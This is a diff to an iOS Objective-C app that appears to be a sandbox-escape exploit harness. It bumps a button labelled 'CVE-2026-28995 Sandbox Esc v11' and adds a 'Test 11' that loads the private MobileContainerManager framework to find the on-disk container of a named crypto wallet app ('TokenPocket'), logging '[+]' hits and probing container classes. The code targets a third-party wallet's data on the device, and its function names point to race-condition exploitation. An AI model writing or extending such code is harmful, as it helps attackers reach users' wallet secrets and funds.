@@ -663,7 +663,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v10" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v11" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7374,6 +7374,57 @@ static void *iohid_threadCopyEvent(void *arg) {
     if (sv) {
         [log appendFormat:@"  ProductVersion: %@\n", sv[@"ProductVersion"]];
         [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
+    }
+
+    // Test 11: MobileContainerManager private framework lookup by bundle ID
+    [log appendString:@"\n--- Test 11: MCMAppContainer lookup (bundleID -> container) ---\n"];
+    [log appendFormat:@"  Target bundleID: %@\n", @"com.global.wallet.ios"];
+    NSBundle *mcmBundle = [NSBundle bundleWithPath:
+        @"/System/Library/PrivateFrameworks/MobileContainerManager.framework"];
+    BOOL loaded = [mcmBundle load];
+    [log appendFormat:@"  Framework loaded: %@\n", loaded ? @"YES" : @"NO"];
+    if (loaded) {
+        Class MCMAppContainer = NSClassFromString(@"MCMAppContainer");
+        [log appendFormat:@"  MCMAppContainer class: %@\n", MCMAppContainer ? @"found" : @"nil"];
+        if (MCMAppContainer) {
+            id container = [MCMAppContainer performSelector:
+                @selector(containerWithIdentifier:error:)
+                withObject:@"com.global.wallet.ios" withObject:nil];
+            [log appendFormat:@"  container result: %@\n", container ?: @"nil"];
+            if (container) {
+                id url = [container performSelector:@selector(url)];
+                [log appendFormat:@"  [+] TokenPocket container URL: %@\n", url];
+                NSString *path = [url performSelector:@selector(path)];
+                [log appendFormat:@"  [+] TokenPocket container path: %@\n", path];
+            }
+        }
+        Class MCMDataContainer = NSClassFromString(@"MCMDataContainer");
+        [log appendFormat:@"  MCMDataContainer class: %@\n", MCMDataContainer ? @"found" : @"nil"];
+        if (MCMDataContainer) {
+            id dContainer = [MCMDataContainer performSelector:
+                @selector(containerWithIdentifier:error:)
+                withObject:@"com.global.wallet.ios" withObject:nil];
+            [log appendFormat:@"  dataContainer result: %@\n", dContainer ?: @"nil"];
+            if (dContainer) {
+                id url = [dContainer performSelector:@selector(url)];
+                [log appendFormat:@"  [+] TP data container URL: %@\n", url];
+            }
+        }
+        Class MCMAppDataContainer = NSClassFromString(@"MCMAppDataContainer");
+        [log appendFormat:@"  MCMAppDataContainer: %@\n", MCMAppDataContainer ? @"found" : @"nil"];
+        [log appendString:@"  Probing container classes:\n"];
+        for (NSString *cn in @[@"MCMContainer", @"MCMContainerManager",
+            @"MCMAppContainer", @"MCMDataContainer", @"MCMPluginContainer",
+            @"MCMSharedDataContainer", @"MCMAppDataContainer"]) {
+            Class c = NSClassFromString(cn);
+            if (c) {
+                [log appendFormat:@"    %@: FOUND\n", cn];
+                id inst = [c performSelector:@selector(alloc)];
+                if (inst) {
+                    [log appendFormat:@"      alloc OK: %@\n", inst];
+                }
+            }
+        }
     }
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
